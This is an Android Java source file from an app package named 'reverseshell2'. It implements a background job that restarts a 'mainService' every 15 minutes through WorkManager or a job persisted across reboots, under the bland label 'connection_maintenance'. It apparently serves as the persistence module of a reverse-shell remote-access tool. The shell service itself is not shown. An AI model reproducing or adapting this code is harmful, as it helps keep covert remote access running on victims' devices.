package com.example.reverseshell2;

import android.app.job.JobInfo;
import android.app.job.JobParameters;
import android.app.job.JobScheduler;
import android.app.job.JobService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.work.Constraints;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;
import java.util.concurrent.TimeUnit;

public class jobScheduler extends JobService {
    private static final String TAG = "jobSchedulerClass";
    private static final String WORK_NAME = "connection_maintenance";
    private static final int JOB_ID = 100;
    private static final long MIN_JOB_INTERVAL = 15 * 60 * 1000L; // 15 minutes
    private static final long FLEX_INTERVAL = 5 * 60 * 1000L; // 5 minutes

    @Override
    public boolean onStartJob(JobParameters params) {
        Log.d(TAG, "Job started");
        scheduleService(getApplicationContext());
        return false; // Job is finished
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        Log.d(TAG, "Job stopped");
        return true; // Reschedule on failure
    }

    public static void scheduleJob(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            // For Android 12+ use WorkManager
            setupWorkManager(context);
        } else {
            // For older versions use JobScheduler
            setupJobScheduler(context);
        }
    }

    private static void setupWorkManager(Context context) {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .setRequiresBatteryNotLow(true)
                .build();

        PeriodicWorkRequest workRequest = new PeriodicWorkRequest.Builder(
                ConnectionMaintenanceWorker.class, 15, TimeUnit.MINUTES)
                .setConstraints(constraints)
                .setInitialDelay(5, TimeUnit.MINUTES)
                .build();

        WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                WORK_NAME,
                ExistingPeriodicWorkPolicy.UPDATE,
                workRequest);
    }

    private static void setupJobScheduler(Context context) {
        ComponentName componentName = new ComponentName(context, jobScheduler.class);
        JobInfo.Builder builder = new JobInfo.Builder(JOB_ID, componentName)
                .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                .setPersisted(true)
                .setPeriodic(MIN_JOB_INTERVAL);

        // Additional options for newer API levels
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            builder.setPeriodic(MIN_JOB_INTERVAL, FLEX_INTERVAL);
        }

        JobScheduler jobScheduler = 
                (JobScheduler) context.getSystemService(Context.JOB_SCHEDULER_SERVICE);
        if (jobScheduler != null) {
            int result = jobScheduler.schedule(builder.build());
            if (result == JobScheduler.RESULT_SUCCESS) {
                Log.d(TAG, "Job scheduled successfully");
            } else {
                Log.e(TAG, "Job scheduling failed");
            }
        }
    }

    private void scheduleService(Context context) {
        try {
            Intent serviceIntent = new Intent(context, mainService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting service", e);
        }
    }

    public static class ConnectionMaintenanceWorker extends Worker {
        public ConnectionMaintenanceWorker(
                @NonNull Context context,
                @NonNull WorkerParameters params) {
            super(context, params);
        }

        @NonNull
        @Override
        public Result doWork() {
            try {
                Context context = getApplicationContext();
                Intent serviceIntent = new Intent(context, mainService.class);
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(serviceIntent);
                } else {
                    context.startService(serviceIntent);
                }
                
                return Result.success();
            } catch (Exception e) {
                Log.e(TAG, "Worker failed", e);
                return Result.retry();
            }
        }
    }
}

